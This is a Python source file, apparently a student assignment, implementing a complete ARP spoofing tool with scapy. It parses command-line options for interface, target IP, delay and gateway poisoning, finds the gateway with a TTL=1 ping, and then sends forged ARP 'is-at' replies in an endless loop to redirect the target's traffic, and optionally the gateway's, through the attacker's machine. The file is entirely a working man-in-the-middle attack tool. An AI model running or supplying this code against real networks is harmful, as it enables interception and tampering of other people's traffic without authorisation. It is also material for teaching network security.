__author__ = "Avital Haziza and Polina Frolov"

from scapy.all import *
from scapy.layers.inet import IP, ICMP
from scapy.layers.l2 import ARP, getmacbyip
import sys


def fake_client(clientIp, gatewayIp, myMac, gatewayMAC):
    arp_response = ARP(pdst=gatewayIp, hwdst=gatewayMAC, psrc=clientIp, hwsrc=myMac, op='is-at')
    send(arp_response)


def fake_gateway(ip, myMac, gatewayIP):
    # Sends a message to each host in the LAN indicating I'm a gateway.
    targetMAC = getmacbyip(ip)
    arp_response = ARP(pdst=ip, hwdst=targetMAC, psrc=gatewayIP, hwsrc=myMac, op='is-at')
    send(arp_response)


def help_function():
    texts = ["usage: ArpSpoofer.py [-h] [-i IFACE] [-s SRC] [-d DELAY] [-gw] -t TARGET", "Spoof ARP tables",
             "optional arguments:",
             "-h, --help                       Show this help message and exit",
             "-i IFACE, --iface IFACE          Interface you wish to use",
             "-s SRC, --src SRC                The address you want for the attacker",
             "-d DELAY, --delay DELAY          Delay (in seconds) between messages",
             "-gw                              Should GW be attacked as well",
             "-t TARGET, --target TARGET       IP of target"]
    for line in texts:
        print(line)


def get_gateway_ip():
    ping = IP(dst="198.49.23.141", ttl=1) / ICMP()  # pinging outside with ttl=1
    reply = sr1(ping, timeout=1)
    replyIpInfo = reply[IP]  # all IP layer information
    gatewayIP = replyIpInfo.src  # source in layer IP
    return gatewayIP


def main():
    len_arg = len(sys.argv)
    i = 0
    flag_help = True
    while i != len_arg:
        if sys.argv[i] == '-h':
            help_function()
            flag_help = False
            break
        i += 1

    if flag_help:
        i = 0
        interface = conf.iface
        while i != len_arg:
            if sys.argv[i] == '-i':
                interface = sys.argv[i + 1]
                break
            i += 1

        source = get_if_addr(conf.iface)
        i = 0
        while i != len_arg:
            if sys.argv[i] == '-s':
                source = sys.argv[i + 1]
            i += 1

        i = 0
        delay = 0
        while i != len_arg:
            if sys.argv[i] == '-d':
                delay = sys.argv[i + 1]
                delay = float(delay)
            i += 1

        gw = False
        i = 0
        while i != len_arg:
            if sys.argv[i] == '-gw':
                gw = True
            i += 1

        i = 0
        targetIp = ""
        while i != len_arg:
            if sys.argv[i] == '-t':
                targetIp = sys.argv[i + 1]
            i += 1

        gatewayIP = get_gateway_ip()
        gatewayMAC = getmacbyip(gatewayIP)
        while True:

            myMac = get_if_hwaddr(interface)
            fake_gateway(targetIp, myMac, gatewayIP)

            if gw:
                fake_client(targetIp, gatewayIP, myMac, gatewayMAC)
            time.sleep(delay)


if __name__ == "__main__":
    main()
